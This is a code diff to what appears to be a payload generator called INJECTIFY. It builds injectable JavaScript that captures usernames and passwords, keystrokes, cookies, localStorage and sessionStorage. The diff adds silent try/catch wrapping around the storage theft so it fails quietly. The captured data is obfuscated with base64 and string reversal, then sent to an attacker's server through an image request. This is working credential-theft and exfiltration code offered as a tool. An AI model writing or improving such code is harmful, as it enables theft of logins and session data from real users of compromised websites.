@@ -899,7 +899,8 @@ MongoClient.connect(config.mongodb, function(err, db) {
 			let variables	= '',
 				header		= '',
 				json		= '',
-				body		= ''
+				body		= '',
+				catcher		= ''
 
 			if (keylogger) {
 				variables += 'm = {}, f = [], g = new Date().getTime(),'
@@ -944,12 +945,19 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				json		+= 'e: j.height * a, f: j.width * a,'
 			}
 			if (location)	json += 'd: k.location.href,'
-			if (localStorage)	json += 'g: localStorage,'
-			if (sessionStorage)	json += 'h: sessionStorage,'
+			if (localStorage)	catcher += 'i.g = localStorage,'
+			if (sessionStorage)	catcher += 'i.h = sessionStorage,'
 			if (cookies)		json += 'i: d.cookie,'
 
 			if (variables)	variables 	= ',' + variables.slice(0, -1)
 			if (json) 		json 		= ',' + json.slice(0, -1)
+			if (catcher) 	{
+				if (req.query.debug == "true") {
+					catcher 	= '\n' + catcher.slice(0, -1)
+				} else {
+					catcher 	= '\ntry {' + catcher.slice(0, -1) + '} catch(error) {}'
+				}
+			}
 
 			let script = `
 				// ┌─────────────────────────────────────┐
@@ -1000,7 +1008,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 						t: 0,
 						b: x.value,
 						c: y.value` + json + `
-					}
+					}` + catcher +  `
 					` + debug("console.log('%c[INJECTIFY] %cCaptured username & password', 'color: #ef5350; font-weight: bold', 'color: #FF9800', i)") +
 						comment("send a request to the server (or proxy) with the BASE64 encoded JSON object") +
 						enc(`c.src=p+btoa(encodeURI(JSON.stringify(i))).split('').reverse().join('')`, true) + 
